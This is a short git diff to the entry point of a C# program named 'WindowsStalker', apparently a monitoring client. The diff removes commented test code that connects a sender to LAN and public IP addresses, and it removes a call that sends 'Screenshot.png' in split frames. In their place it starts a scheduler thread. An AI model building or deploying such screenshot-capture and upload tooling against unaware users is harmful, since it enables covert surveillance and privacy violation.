@@ -1,5 +1,4 @@
 ﻿using System.Management;
-using System.Text;
 using System.Threading;
 
 namespace WindowsStalker
@@ -11,46 +10,9 @@ namespace WindowsStalker
 
         public static void Main(string[] args)
         {
-//            Scheduler scheduler = new Scheduler();
-//            scheduler.StartScheduling();
-//
-//            Stopwatch s = new Stopwatch();
-//            s.Start();
-//
-//            while (true)
-//            {
-//                if (s.Elapsed > TimeSpan.FromSeconds(45))
-//                {
-//                    scheduler.UpdateConfiguration(15, 15);
-//                    s.Stop();
-//                    break;
-//                }
-//            }
-//          local Winiar - 192.168.0.199 : 8888
-//          test host -  192.168.0.101 : 11000, remote host - 37.233.98.52 : 8888
-//            bool Winiar = false;
-//            Sender sender;
-//            if (Winiar)
-//            {
-//                sender = new Sender("192.168.0.199", 8888);
-//            }
-//            else
-//            {
-//                sender = new Sender("192.168.0.101", 11000);
-//            }
-//
-//            sender.StartSender();
-//            Thread listeningThread = new Thread(sender.Listen);
-//            listeningThread.Start();
-//
-//            //sample echo message
-//            byte[] sampleMessage = Encoding.ASCII.GetBytes("Hello man!<EOF>");
-//            sender.SendFrame(sampleMessage);
-//            sender.SendFrame(sampleMessage);
-
-            Serializer s = new Serializer();
-            var toSent = s.SendFile("Screenshot.png", 1);
-            s.SendSplitedFile(toSent);
+            Scheduler s = new Scheduler();
+            Thread sThread = new Thread(s.StartScheduling);
+            sThread.Start();
         }
 
         public static string GetComputerID()
